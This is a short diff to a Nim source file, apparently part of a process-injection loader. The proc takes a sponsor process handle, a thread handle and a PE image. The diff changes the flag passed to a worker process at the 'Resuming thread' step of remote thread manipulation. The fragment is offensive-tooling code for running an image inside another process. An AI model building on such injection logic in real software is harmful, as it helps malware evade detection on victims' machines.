@@ -189,7 +189,7 @@ proc nimlineSplitted*(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImage
 
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
-    ppi = createProcessWorker("-T:" & $sponsorThreadHandle)
+    ppi = createProcessWorker("-R:" & $sponsorThreadHandle)
     WaitForSingleObject(ppi.hProcess, 3 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
